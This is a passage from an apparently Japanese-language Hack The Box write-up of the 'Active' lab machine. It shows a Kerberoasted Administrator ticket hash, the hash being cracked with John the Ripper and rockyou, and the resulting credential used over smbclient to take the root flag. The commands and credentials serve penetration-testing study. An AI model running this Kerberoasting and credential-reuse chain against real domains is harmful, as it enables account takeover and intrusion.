$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5eea75d09bace8c5951f8c34fe0c2e49$77fb166aa5750fbcd61bd1d75ab0e4246711df735b30fe4a1fd4b0ad9b741be697aeac2c4c481c021d728a4b43caa98c424cbeba934ea1f68a079f0a1b1f30667899a3442774acf261735b998023f6e13e00a2106a776a4ab08957135abcf4fc025e87a5eb5d3aa1d63a59283adfaf28950ab24a55febd99f3f9c46ead4e78e8ccd1368a2a6b2c9851492298653956335cfb621a6510da14c62b8c032fdfcbb8ce1cdf6904aa7ebe2e4d0d49e08f7a39d6470191cc46bea24eedc1df65dd19d31eeb081db217565307775690dadee02e9d009f51d4a9b649896e7a60cc93ad53ea7b892e81a728ac4c1a98375cb0ce90042b1d2c68d4acde84667adf484be97773077058a94dc585487944479bb98fbea304e84bfead2535dc2bd2d18e1c910e7dc4bcd9ccc4a55c0840bed86698cc8ba2e1d8b699c847740a05a16f5b4f4ed937c142b70f26a542223496c1eeeabcb487ecda951964bd57c52959607c9b4d010b8211c8f41c060418f92347d9b1a22b09ac922bd5f96f9d12f009332410f00ca54447e9058045436e11da7ef2f41bddf117af195438e1b717bf66660dc97170f985563442faf1a0c5ef5099b01a76580a32cbd3070d4f93a9ef87462191fa0adad14d78306d646dd8840317734d43f7b3a1cbdb1b801200868bda8b70e24fcc10661c4a2342e5a78d8810466f5344ba2589a5a364dda92a26e90d8cf623c6eb1035fcfafff09a5a853415703b4f559f3a155510d5ee00546e4246bd4e2487e1e28743e72e3b8ffb5735d6986bc0aa84fc414917928dc50942a76f4fc8eeb8b160e4f27fbedf34ddc71c2f5e48ee5f9bae5e6298255af9e749f4b30353170d6eccbb096165972c8800342c655bb0698e6bde208c53d63e3e09c11776a4cbe2103e6499f39c7677cc81fb30e5e63b97a9d0c4bdb5494a430ebc66dd749c227875e9bd280edaa3fe2e97213fc2ddb95bc64291060e9fa9c03f387d29623ef8ce8f96ad763a3f844a7b2c08a18e2c7689d791312e51ae21063fccbf5c8a782dceae1b8f4f97c769db6f28b7f726580bfc978781f380a3410dafa1457bafbc28124d6b218725a562e504976b44397c7cf2d35ab413adff9f07523ebc1a8475b1201bb2357840b6f373ea06fb0093c34d896ca4f068f670f9418324e8de40f831b2f6964d91338ffcbd2a9f5d18ff6c74591ee8cd8105a26c5df67952543fcc64f32f10857c8903df4c8f47ba1acc60118cf52927d151025e44f806ae

```

ハッシュをクラックする
```sh
└──╼ [★]$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:05 DONE (2025-05-08 02:32) 0.1996g/s 2103Kp/s 2103Kc/s 2103KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

### 認証情報2
Administrator:Ticketmaster1968

# Privilege Escalation

得られた認証情報のテスト
```bash
┌─[sg-dedivip-1]─[10.10.14.14]─[snowyowl644@htb-4poqtzmzow]─[~]
└──╼ [★]$ smbclient //10.129.213.56/Users -U Administrator
Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 09:39:20 2018
  ..                                 DR        0  Sat Jul 21 09:39:20 2018
  Administrator                       D        0  Mon Jul 16 05:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 00:06:44 2009
  Default                           DHR        0  Tue Jul 14 01:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 00:06:44 2009
  desktop.ini                       AHS      174  Mon Jul 13 23:57:55 2009
  Public                             DR        0  Mon Jul 13 23:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 10:16:32 2018

```

フラグの取得
```bash
smb: \Administrator\Desktop\> get root.txt
getting file \Administrator\Desktop\root.txt of size 34 as root.txt (5.5 KiloBytes/sec) (average 5.5 KiloBytes/sec)
smb: \Administrator\Desktop\> 

```